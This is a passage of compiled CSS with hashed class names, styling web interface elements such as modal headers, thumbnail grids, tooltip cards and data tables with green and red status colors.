        justify-content: space-between
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._1HzRBTVxmaVT3Zi0Iflw3m ._2v54Znk7D_4ivN2s0Jk9mx ._1nzRys1QDZOgoD4Voy9rkj {
        display: inline-flex;
        font-size: 20px;
        font-weight: 700;
        line-height: 38px;
        color: #000;
        align-items: center;
        cursor: pointer
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._1HzRBTVxmaVT3Zi0Iflw3m ._2v54Znk7D_4ivN2s0Jk9mx ._1nzRys1QDZOgoD4Voy9rkj span {
        display: inline-flex;
        cursor: pointer
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._1HzRBTVxmaVT3Zi0Iflw3m ._2v54Znk7D_4ivN2s0Jk9mx:after {
        content: '';
        display: block;
        width: 100%;
        position: absolute;
        bottom: 0;
        left: 0px;
        border-bottom: 1px solid #e2e4e5
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._1HzRBTVxmaVT3Zi0Iflw3m ._2Ds9qMHIC6i_Sp_pxLoMAA {
        color: #ccc;
        position: absolute;
        top: 32px;
        right: 38px;
        width: 25px;
        height: 25px;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        user-select: none
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._1HzRBTVxmaVT3Zi0Iflw3m ._2Ds9qMHIC6i_Sp_pxLoMAA:hover svg path {
        fill: var(--ah-red-100)
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._1HzRBTVxmaVT3Zi0Iflw3m ._2Ds9qMHIC6i_Sp_pxLoMAA:active svg path {
        fill: var(--ah-red-300)
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._1HzRBTVxmaVT3Zi0Iflw3m ._3clIF1autuyqykDjgCFRzw {
        height: 100%;
        width: 100%;
        background-repeat: no-repeat;
        background-position: center;
        margin: auto;
        max-width: 512px;
        background-size: cover
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._1HzRBTVxmaVT3Zi0Iflw3m ._1z5ceczCbjRLfdiQGxE_C4 {
        padding: 4px;
        border-radius: 2px;
        width: 52px;
        height: 52px
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._1HzRBTVxmaVT3Zi0Iflw3m ._1z5ceczCbjRLfdiQGxE_C4._344oqBysgmF9af6lD7QKY4 {
        background: #fde8ea;
        border: 1px solid #e9162b
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._1HzRBTVxmaVT3Zi0Iflw3m ._34KApdMgQmCeowybPgrOdN {
        width: 100%;
        height: 100%;
        border-radius: 2px;
        user-select: none;
        cursor: pointer;
        background-repeat: no-repeat;
        background-size: cover;
        background-position: center
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._3aAF1hDWflKfFkS5wygn9c {
        display: flex;
        flex-direction: column;
        height: calc(100% - 80px);
        align-items: center;
        justify-content: center
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._3aAF1hDWflKfFkS5wygn9c ._1OGRU9VVqr0ZcuSIz4GF_P {
        flex: 10;
        width: 100%;
        align-items: center;
        justify-content: center;
        display: flex;
        padding: 20px 40px;
        padding-bottom: 0
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._3aAF1hDWflKfFkS5wygn9c .sEjcP-SpmRcs3uhD4QLoc {
        display: grid;
        gap: 18px;
        grid-template-columns: repeat(auto-fit, minmax(48px, 48px));
        width: 100%;
        justify-content: center;
        flex: 1;
        padding: 32px
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._3OwfwbCp8-dAQwN-IlyDIF {
        position: absolute;
        top: 50%;
        right: 0;
        height: 0;
        left: 0;
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 0 32px;
        z-index: 9
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._3OwfwbCp8-dAQwN-IlyDIF ._3210VlBwoWQODeUs_-zChO {
        width: 25px;
        height: 25px;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        user-select: none
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._3OwfwbCp8-dAQwN-IlyDIF ._3210VlBwoWQODeUs_-zChO:hover svg path {
        fill: var(--ah-red-100)
    }

    ._3PPowEPlv172Ut2Aj3DTwx ._3OwfwbCp8-dAQwN-IlyDIF ._3210VlBwoWQODeUs_-zChO:active svg path {
        fill: var(--ah-red-300)
    }

    .sMBBbKqceqLKnnegscuSw._3-1NgkX2EpYYsBxIePdGJt {
        position: relative;
        padding-bottom: 38px
    }

    .sMBBbKqceqLKnnegscuSw._3-1NgkX2EpYYsBxIePdGJt ._3VXG5JSiIJn0VdKbk8dJrs {
        position: relative;
        width: 268px;
        padding: 16px;
        background: #fff;
        border-radius: 4px;
        border: 1px solid #eaeaea
    }

    .sMBBbKqceqLKnnegscuSw._3-1NgkX2EpYYsBxIePdGJt ._3VXG5JSiIJn0VdKbk8dJrs ._27-fKRJiGS1DOEa3YuLkOb {
        font-size: 10px;
        color: #2e2e2e
    }

    .sMBBbKqceqLKnnegscuSw._3-1NgkX2EpYYsBxIePdGJt ._3VXG5JSiIJn0VdKbk8dJrs ._2g4S90d6T_w72CjOpjzL-i {
        font-size: 16px;
        font-weight: 500;
        color: #011627;
        margin-top: 15px
    }

    .sMBBbKqceqLKnnegscuSw._3-1NgkX2EpYYsBxIePdGJt ._3VXG5JSiIJn0VdKbk8dJrs ._2McAY_m-Y5j-SV4uVwgQVT {
        color: #6d6d6d;
        margin-top: 10px
    }

    .sMBBbKqceqLKnnegscuSw._3-1NgkX2EpYYsBxIePdGJt ._3VXG5JSiIJn0VdKbk8dJrs ._2yoJpLIViCgoXOk_SKitV8 {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-top: 16px
    }

    .sMBBbKqceqLKnnegscuSw._3-1NgkX2EpYYsBxIePdGJt ._3VXG5JSiIJn0VdKbk8dJrs ._2yoJpLIViCgoXOk_SKitV8 .m1vnzrrhljyvJPAhPoVDe {
        color: #ababab;
        cursor: pointer
    }

    .sMBBbKqceqLKnnegscuSw._3-1NgkX2EpYYsBxIePdGJt ._3VXG5JSiIJn0VdKbk8dJrs ._2yoJpLIViCgoXOk_SKitV8 ._3FMLlxf2yHBB96fEKDEUuW {
        padding: 5px 12px;
        background-color: #d5d5d5;
        border-radius: 3px;
        color: #011627;
        cursor: pointer
    }

    .sMBBbKqceqLKnnegscuSw._3-1NgkX2EpYYsBxIePdGJt ._3VXG5JSiIJn0VdKbk8dJrs ._2yoJpLIViCgoXOk_SKitV8 ._2VDrJW3oSubiJens_-rusa {
        padding: 4px 14px;
        background-color: #011627;
        border-radius: 3px;
        color: #fff;
        cursor: pointer;
        margin-left: 6px
    }

    .sMBBbKqceqLKnnegscuSw._3-1NgkX2EpYYsBxIePdGJt ._3VXG5JSiIJn0VdKbk8dJrs ._3JwEqDeEMGMSBse_Qve0xI {
        position: absolute;
        top: calc(100% - 2px);
        left: 34px;
        display: flex;
        justify-content: center;
        width: 1px;
        height: 38px;
        border-left: 1px dashed #e9162b
    }

    .sMBBbKqceqLKnnegscuSw._3-1NgkX2EpYYsBxIePdGJt ._3VXG5JSiIJn0VdKbk8dJrs ._3JwEqDeEMGMSBse_Qve0xI span {
        position: absolute;
        top: 0;
        left: -3px;
        width: 6px;
        height: 6px;
        background: #e9162b;
        border-radius: 50%;
        box-shadow: 0 0 0 6px rgba(233, 22, 43, 0.3)
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR {
        padding: 0 20px
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR .vHrzdTxSaKlbOSxS_peXb {
        box-shadow: 0px 1px 8px rgba(0, 0, 0, 0.08);
        margin-left: -20px;
        margin-right: -20px;
        padding-left: 20px;
        padding-right: 20px;
        padding-bottom: 12px;
        position: relative;
        display: flex;
        justify-content: space-between
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR .vHrzdTxSaKlbOSxS_peXb ._45cr0UGpODVutbomWpWBa {
        display: inline-flex;
        align-items: center
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR .vHrzdTxSaKlbOSxS_peXb ._45cr0UGpODVutbomWpWBa .FhmD14BHzlQCf6jNn6syE {
        font-size: 20px;
        font-weight: 700;
        line-height: 38px;
        color: #000
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR .vHrzdTxSaKlbOSxS_peXb:after {
        content: '';
        display: block;
        width: calc(100% + 40px);
        position: absolute;
        bottom: 0;
        left: -20px
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR ._2UHLryU56swx80zWnbEquD {
        max-width: 80%;
        margin-top: 24px;
        min-height: 250px
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR ._2UHLryU56swx80zWnbEquD ._1Y6RD-ur_U7yru1G5xWnMI {
        display: flex
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR ._2UHLryU56swx80zWnbEquD ._1Y6RD-ur_U7yru1G5xWnMI ._1nXMM8TPutusPCvaO-_cQf {
        color: #006fe3;
        font-weight: 500;
        margin-left: 30px;
        cursor: pointer
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR ._2UHLryU56swx80zWnbEquD ._3QjmsgAICfLuB4tWOKZvh3 {
        margin-top: 14px;
        display: grid;
        grid-template-columns: 0.6fr 0.6fr;
        column-gap: 30px
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR ._2UHLryU56swx80zWnbEquD ._3QjmsgAICfLuB4tWOKZvh3 ._1beLoxZpEgFZ50nTSkXvTd {
        display: grid;
        grid-template-columns: 77px 1fr;
        padding: 10px;
        border-radius: 6px;
        border: 1px solid #d9d9d9;
        column-gap: 12px
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR ._2UHLryU56swx80zWnbEquD ._3QjmsgAICfLuB4tWOKZvh3 ._1beLoxZpEgFZ50nTSkXvTd .aJW653n1JSKa8i7dGsKi8 {
        width: 77px;
        height: 77px;
        overflow: hidden;
        border-radius: 4px
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR ._2UHLryU56swx80zWnbEquD ._3QjmsgAICfLuB4tWOKZvh3 ._1beLoxZpEgFZ50nTSkXvTd .aJW653n1JSKa8i7dGsKi8 img {
        width: 100%;
        height: 100%
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR ._2UHLryU56swx80zWnbEquD ._3QjmsgAICfLuB4tWOKZvh3 ._1beLoxZpEgFZ50nTSkXvTd ._3Dn8i4CQSdYJGJ62CRMLW4 ._-2AIQQBIQ0YSAVHttu2Wa a {
        overflow: hidden;
        text-overflow: ellipsis;
        -webkit-line-clamp: 2;
        display: -webkit-box;
        -webkit-box-orient: vertical;
        color: #7b7b7b;
        cursor: pointer
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR ._2UHLryU56swx80zWnbEquD ._3QjmsgAICfLuB4tWOKZvh3 ._1beLoxZpEgFZ50nTSkXvTd ._3Dn8i4CQSdYJGJ62CRMLW4 ._-2AIQQBIQ0YSAVHttu2Wa a:hover {
        color: var(--ah-secondary)
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR ._2UHLryU56swx80zWnbEquD ._3QjmsgAICfLuB4tWOKZvh3 ._1beLoxZpEgFZ50nTSkXvTd ._3Dn8i4CQSdYJGJ62CRMLW4 .O16N3F9_hszYNJ-EVfgbC {
        color: #262626;
        margin-top: 4px
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR ._2UHLryU56swx80zWnbEquD ._3QjmsgAICfLuB4tWOKZvh3 ._1beLoxZpEgFZ50nTSkXvTd ._3Dn8i4CQSdYJGJ62CRMLW4 .EmvsCc_HrbmIVkRPjpQaC {
        color: #7b7b7b;
        margin-top: 4px
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR ._2UHLryU56swx80zWnbEquD ._3QjmsgAICfLuB4tWOKZvh3 ._1beLoxZpEgFZ50nTSkXvTd ._3Dn8i4CQSdYJGJ62CRMLW4 .EmvsCc_HrbmIVkRPjpQaC span {
        color: #262626;
        display: inline-flex;
        margin-left: 15px
    }

    ._2K6dzge0yJyHYSZdqaXJjj._3uXCbG0WlhjWs18zUVbuzR ._3Dtu8XyPK1DU1rT7TVD5TW {
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 70px 0
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt {
        margin-top: 20px
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg {
        display: table;
        width: 100%
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._2aPxhzn5UOXV46KojljgMI {
        display: table-header-group
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._2aPxhzn5UOXV46KojljgMI ._29pzCKSNUh_MKjmNhdllX0 {
        display: table-row
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._2aPxhzn5UOXV46KojljgMI ._29pzCKSNUh_MKjmNhdllX0 ._3JmBPYdhYgxd-yHOv_O5gV {
        display: table-cell;
        padding: 13px 10px;
        background: #e9e9e9;
        font-weight: 500
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._2aPxhzn5UOXV46KojljgMI ._29pzCKSNUh_MKjmNhdllX0 ._3JmBPYdhYgxd-yHOv_O5gV._3YPD_DtYdFXSsZt3nkGX2X {
        width: 40%
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._2aPxhzn5UOXV46KojljgMI ._29pzCKSNUh_MKjmNhdllX0 ._3JmBPYdhYgxd-yHOv_O5gV.FcryCpScnMcBg7D6gc75v {
        width: 15%
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._2aPxhzn5UOXV46KojljgMI ._29pzCKSNUh_MKjmNhdllX0 ._3JmBPYdhYgxd-yHOv_O5gV.LR2OBzRzhfz9j6UQXIon7 {
        width: 20%
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._2aPxhzn5UOXV46KojljgMI ._29pzCKSNUh_MKjmNhdllX0 ._3JmBPYdhYgxd-yHOv_O5gV._2lWaY1t3QFpGosill42Ygj {
        width: 15%
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._2aPxhzn5UOXV46KojljgMI ._29pzCKSNUh_MKjmNhdllX0 ._3JmBPYdhYgxd-yHOv_O5gV._3GHD7s4HuHlaJJKxa5HKb9 {
        width: 15%
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._2aPxhzn5UOXV46KojljgMI ._29pzCKSNUh_MKjmNhdllX0 ._3JmBPYdhYgxd-yHOv_O5gV:first-child {
        border-top-left-radius: 4px;
        border-bottom-left-radius: 4px
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._2aPxhzn5UOXV46KojljgMI ._29pzCKSNUh_MKjmNhdllX0 ._3JmBPYdhYgxd-yHOv_O5gV:last-child {
        border-top-right-radius: 4px;
        border-bottom-right-radius: 4px
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn {
        display: table-header-group
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 {
        display: table-row
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq {
        display: table-cell;
        padding: 14px 10px;
        text-align: left;
        vertical-align: middle;
        border-bottom: 1px solid #e2e4e5
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq._29kBU-JCfViet5ZYugx7H1 * {
        cursor: pointer
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq ._2uFSMUCkarge6FJ3ecm_ri {
        width: 60px;
        height: 60px;
        border-radius: 4px
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq ._9hxPzmxF3l82ITjTMTCvn {
        max-width: 280px;
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
        overflow: hidden;
        min-height: 24px;
        margin-left: 16px
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq ._9hxPzmxF3l82ITjTMTCvn:hover {
        color: var(--ah-primary-hover)
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq .KVrRLO1yPn2ScPa-AbFo {
        position: absolute;
        top: 0;
        right: 0;
        left: 0;
        bottom: 0;
        border-radius: 4px;
        background-color: rgba(0, 0, 0, 0.7);
        display: flex;
        align-items: center;
        justify-content: center
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq._2wqO1d6YPVSXzdsg1-Si8Y>span {
        display: flex;
        align-items: center
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq._2wqO1d6YPVSXzdsg1-Si8Y>span span {
        display: inline-flex;
        margin-right: 5px
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq .dIKTjF5TNE6AllxynA-ve,
    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq ._4sPW6GXSkd0tprL9ryPyu {
        color: #21a67a;
        display: flex;
        align-items: center
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq .dIKTjF5TNE6AllxynA-ve svg,
    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq ._4sPW6GXSkd0tprL9ryPyu svg {
        margin-left: 5px;
        width: 8px !important
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq .dIKTjF5TNE6AllxynA-ve svg,
    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq .dIKTjF5TNE6AllxynA-ve path,
    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq ._4sPW6GXSkd0tprL9ryPyu svg,
    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq ._4sPW6GXSkd0tprL9ryPyu path {
        fill: #21a67a
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq ._1owbdYMktS-BVD3oTL53C3,
    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq ._1ar8xGGod1Yoavzirjfygu {
        color: #e9162b;
        display: flex;
        align-items: center
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq ._1owbdYMktS-BVD3oTL53C3 svg,
    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq ._1ar8xGGod1Yoavzirjfygu svg {
        margin-left: 5px;
        width: 8px !important
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq ._1owbdYMktS-BVD3oTL53C3 svg,
    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq ._1owbdYMktS-BVD3oTL53C3 path,
    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq ._1ar8xGGod1Yoavzirjfygu svg,
    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .h6AqGNOsqD8Zzi4fjPGKg ._3A_4Mfl-A-MsnOy3ZGmzAn ._29pzCKSNUh_MKjmNhdllX0 ._33lN53ZKUIH9ZJong_EaJq ._1ar8xGGod1Yoavzirjfygu path {
        fill: #e9162b
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .SlLyfcOL3uWgJiHST3_0y {
        padding: 20px 0;
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .SlLyfcOL3uWgJiHST3_0y div {
        cursor: pointer
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt .SlLyfcOL3uWgJiHST3_0y span {
        color: #006fe3;
        font-weight: 600;
        display: flex;
        justify-content: center;
        cursor: pointer
    }

    ._3EEwscDBKwwX-OSNKTiA3a._1idOd6z-PNrWETL1U6TUMt ._1i78q4bsrPTiO3CfrhrlA6 {
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso {
        margin-top: 20px
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._3NjRT__eTl96KRXqIRfpH4 {
        padding-bottom: 12px;
        position: relative;
        display: flex;
        justify-content: space-between
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._3NjRT__eTl96KRXqIRfpH4 ._3JaXGdECNvxDB9Wz37d1WN {
        display: inline-flex;
        align-items: center
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._3NjRT__eTl96KRXqIRfpH4 ._3JaXGdECNvxDB9Wz37d1WN ._28edDjh5sbnXQuqJBHoVHx {
        font-size: 20px;
        font-weight: 700;
        line-height: 38px;
        color: #000
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._3NjRT__eTl96KRXqIRfpH4:after {
        content: '';
        display: block;
        width: calc(100% + 40px);
        position: absolute;
        bottom: 0;
        left: -20px;
        border-bottom: 1px solid #e2e4e5
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._2UeaVtN-lTl7RcuJ01nfTE {
        display: flex
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._2UeaVtN-lTl7RcuJ01nfTE ._3W0K-MCprtCWKwm48kzHtA {
        display: inline-flex
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._2UeaVtN-lTl7RcuJ01nfTE .VH5z9_p2nS5bilNk7cN0z {
        display: inline-flex;
        margin-left: 30px;
        cursor: pointer;
        color: #006fe3
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._3Ge6mRXg-zZoskeJuus5Y4 {
        position: relative
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._3Ge6mRXg-zZoskeJuus5Y4 ._22XcN28DzodbMeptA4onJ5 {
        position: absolute;
        top: 0;
        left: -20px;
        right: -20px;
        bottom: 0;
        border-radius: 0 0 6px 6px;
        overflow: hidden;
        z-index: 999999
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .OSOJGvXI8fHB1YLv8tW_k {
        position: sticky;
        top: 0;
        padding-top: 20px;
        display: grid;
        grid-template-columns: 0.75fr 70px 1fr;
        padding-bottom: 10px;
        background: #fff;
        border-bottom: 1px solid #e2e4e5;
        z-index: 1000
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .OSOJGvXI8fHB1YLv8tW_k ._3nA3C53M4bPyTi-REL_MEp {
        display: grid;
        grid-template-columns: 68px 1fr
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .OSOJGvXI8fHB1YLv8tW_k ._3nA3C53M4bPyTi-REL_MEp .E5xnhCodrXqUZvEFdDmGh {
        width: 68px;
        height: 68px;
        margin-right: 10px;
        display: flex;
        border-radius: 4px;
        overflow: hidden
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .OSOJGvXI8fHB1YLv8tW_k ._3nA3C53M4bPyTi-REL_MEp .E5xnhCodrXqUZvEFdDmGh img {
